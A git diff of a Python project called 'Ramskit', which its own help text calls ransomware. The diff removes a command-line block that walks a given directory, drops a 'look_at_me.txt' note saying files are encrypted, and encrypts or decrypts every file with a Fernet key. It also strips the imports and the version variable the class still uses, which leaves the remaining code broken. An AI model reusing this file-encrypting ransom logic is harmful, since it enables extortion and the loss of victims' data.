@@ -15,14 +15,11 @@ GNU General Public License for more details.
 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>. """
 
-import os
-import sys
-import argparse
+
 from cryptography.fernet import Fernet
 
-current_version = "v1.0.0"
 
-# TODO 1: Add usages for encrypt
+# TODO 2: Add usages for encrypt
 class Ramskit:
     def __init__(self) -> None:
         print(f"[x] Starting Ramskit {current_version}")
@@ -87,39 +84,3 @@ class Ramskit:
         else:
             yield something
 
-# TODO 2: Add usages for Ramski framework
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
-    parser.add_argument('-a', '--action', dest="action", required=True,
-                        help='Action to perform [encrypt/decrypt/generate_key]')
-    parser.add_argument('-p', '--path', dest="path", help='Path to file(s) to encrypt/decrypt')
-    args = parser.parse_args()
-    
-    ramskit = Ramskit()
-    key = ramskit.load_key()
-
-    action = args.action.lower()
-    path = args.path
-
-    items: [str] = list(Ramskit.flatten(Ramskit.expand_dir(path)))
-    lam = os.path.join(path, 'look_at_me.txt')
-
-    if action == 'encrypt':
-        with open(lam, 'w') as f:
-            f.write('''
-                Heyo, this file has been encrypted!. \n\n
-            ''')
-        ramskit.encrypt_file(items, key)
-    elif action == 'decrypt':
-        if not os.path.exists(lam):
-            print('No look_at_me.txt file found. Exiting...')
-            sys.exit(1)
-            
-        os.remove(lam)
-        items.remove(lam)
-        ramskit.decrypt_file(items, key)
-    elif action == 'generate_key':
-        print(Ramskit.generate_key())
-    else:
-        raise Exception('Invalid action: ', action)
-        sys.exit(1)
